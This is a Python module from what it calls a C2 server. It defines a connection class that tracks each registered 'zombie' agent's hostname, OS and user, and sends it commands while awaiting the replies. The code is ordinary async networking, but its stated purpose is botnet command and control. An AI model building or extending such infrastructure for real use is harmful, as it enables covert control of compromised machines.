"""Conexion de un agente (host zombie) registrado en el servidor C2."""
from __future__ import annotations

import asyncio
import contextlib
import time
import uuid
from dataclasses import dataclass, field

from .protocol import encode

SEND_TIMEOUT = 5.0


@dataclass
class AgentConnection:
    """Conexion activa de un agente con su estado y solicitudes pendientes."""

    agent_id: str
    peer: str
    reader: asyncio.StreamReader = field(repr=False)
    writer: asyncio.StreamWriter = field(repr=False)
    hostname: str = ""
    os_info: str = ""
    user: str = ""
    version: str = ""
    connected_at: float = field(default_factory=time.monotonic)
    last_seen: float = field(default_factory=time.monotonic)
    commands_sent: int = 0
    _pending: dict[str, asyncio.Future] = field(default_factory=dict, repr=False, compare=False)
    _send_lock: asyncio.Lock = field(default_factory=asyncio.Lock, repr=False, compare=False)

    @property
    def age(self) -> float:
        return time.monotonic() - self.connected_at

    @property
    def idle(self) -> float:
        return time.monotonic() - self.last_seen

    def touch(self) -> None:
        self.last_seen = time.monotonic()

    async def send(self, message: dict) -> None:
        async with self._send_lock:
            if getattr(self.writer, "is_closing", lambda: False)():
                raise ConnectionError("conexion cerrada")
            self.writer.write(encode(message))
            drain = getattr(self.writer, "drain", None)
            if drain is not None:
                await asyncio.wait_for(drain(), timeout=SEND_TIMEOUT)

    async def request(self, name: str, args: dict | None = None, timeout: float = 10.0) -> dict:
        command_id = uuid.uuid4().hex[:12]
        future = asyncio.get_running_loop().create_future()
        self._pending[command_id] = future
        self.commands_sent += 1
        try:
            await self.send({"type": "command", "id": command_id, "name": name, "args": args or {}})
            return await asyncio.wait_for(future, timeout)
        finally:
            self._pending.pop(command_id, None)

    def resolve(self, message: dict) -> bool:
        command_id = message.get("id")
        if not isinstance(command_id, str):
            return False
        future = self._pending.get(command_id)
        if future is None or future.done():
            return False
        future.set_result(message)
        return True

    def fail_pending(self, error: Exception) -> None:
        for future in list(self._pending.values()):
            if not future.done():
                future.set_exception(error)

    def close(self) -> None:
        with contextlib.suppress(Exception):
            self.writer.close()
